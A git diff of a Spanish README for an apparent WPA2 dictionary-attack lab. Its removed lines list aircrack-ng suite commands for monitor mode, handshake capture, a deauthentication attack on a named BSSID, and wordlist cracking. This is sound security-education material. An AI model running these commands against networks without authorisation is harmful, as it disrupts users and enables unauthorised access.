@@ -26,55 +26,12 @@ Demostrar la vulnerabilidad de las redes WiFi WPA2 ante ataques de diccionario, 
 - Análisis de resultados y conclusiones
 
 - ---
+## 📚 Recursos y Herramientas
 
-## 📁 Fase 1: Configuración del Hardware y Preparación del Entorno
-
-### 🛠️ Selección del Adaptador WiFi
-- **Modelo:** USB AC1200 (LV-UAC15)
-- **Chipset:** RTL88x2bu
-- **Sistema:** Linux Mint (kernel 7.0.0-28)
-
-### 🔧 Instalación de Drivers en Linux
-- Instalación desde el PPA `kelebek333/kablosuz`.
-- Verificación del adaptador con `lsusb`.
-
-### 📡 Activación del Modo Monitor
-- Comando: `sudo airmon-ng start wlx909164306c59`
-- Verificación: `iwconfig` y `ip link show`
-
-### ✅ Verificación del Funcionamiento
-- Escaneo de redes: `sudo airodump-ng wlx909164306c59`
-- Confirmación de captura de paquetes y redes visibles.
-
----
-
-## 📁 Fase 2: Captura y Análisis del Handshake WPA2
-
-### 🔍 Escaneo de Redes
-- Identificación de la red objetivo: `FSociety_NoVoilesEICodigo`
-- BSSID: `30:16:9D:81:12:17`
-- Canal: 9
-
-### 📡 Captura del Handshake
-- Enfoque en la red: `sudo airodump-ng -c 9 --bssid 30:16:9D:81:12:17 -w captura_fsociety wlx909164306c59`
-- Forzar reconexión: `sudo aireplay-ng -0 2 -a 30:16:9D:81:12:17 wlx909164306c59`
-- Verificación: `sudo aircrack-ng captura_fsociety-01.cap`
-
-### 🧩 Resolución del Problema del SSID Oculto
-- **Problema:** `aircrack-ng` requería el ESSID, pero el archivo `.cap` no lo contenía.
-- **Solución:** Captura del ESSID en vivo con `airodump-ng` y `aireplay-ng`.
-- **ESSID obtenido:** `FSociety_NoVoilesEICodigo`
-
-### 🔓 Ataque de Diccionario con Aircrack-ng
-- Diccionario utilizado: `master.list`
-- Comando: `sudo aircrack-ng -w /home/leon2001/Documentos/wordlist/WPA/master.list -e FSociety_NoVoilesEICodigo captura_fsociety-01.cap`
-- **Resultado:** La contraseña no se encontró en el diccionario.
-
-### 📊 Análisis de Resultados y Conclusiones
-- La contraseña es robusta frente a ataques de diccionario comunes.
-- El SSID oculto no impide la captura del handshake ni el descubrimiento del nombre de la red.
-- La seguridad de una red WiFi depende de la fortaleza de la contraseña.
-
+- **Aircrack-ng:** Suite para análisis de redes WiFi.
+- **Wireshark:** Análisis de paquetes.
+- **Adaptador WiFi USB AC1200 (RTL88x2bu):** Hardware compatible con modo monitor.
+- **Diccionarios:** `master.list`, `rockyou.txt`.
 ---
 
 ### 📄 Documentación
